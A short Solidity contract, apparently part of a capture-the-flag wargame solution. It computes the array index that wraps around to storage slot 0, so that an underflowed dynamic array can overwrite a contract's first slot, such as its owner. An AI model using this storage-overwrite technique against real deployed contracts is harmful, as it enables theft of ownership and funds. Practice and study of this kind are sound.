pragma solidity ^0.5;

contract HackAlienCodex {
    function getIndex() public pure returns(uint256){
        bytes32 one = keccak256(abi.encode(bytes32(uint(1))));
        uint256 posCodex = uint256(one);
        uint256 max = 2**256 - 1;
        return max - posCodex + 1;
    }
 }
